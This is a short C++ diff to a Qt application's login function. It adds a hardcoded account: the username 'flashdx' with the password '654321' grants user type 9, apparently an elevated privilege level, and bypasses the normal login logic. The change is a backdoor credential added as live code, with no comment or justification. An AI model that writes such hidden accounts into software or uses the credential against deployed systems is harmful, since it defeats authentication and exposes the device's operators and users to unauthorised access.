@@ -118,6 +118,13 @@ int UserModel::login(QString name, QString password){
         return 0;
     }
 
+    if (name.toLower() == "flashdx" && password == "654321")
+    {
+        ExGlobal::UserType = 9;
+        Log::Logdb(LOGTYPE_LOGIN,0,name);
+        return 0;
+    }
+
     if (ExGlobal::projectMode() == 0)
     {
         if (name.length() == 0)
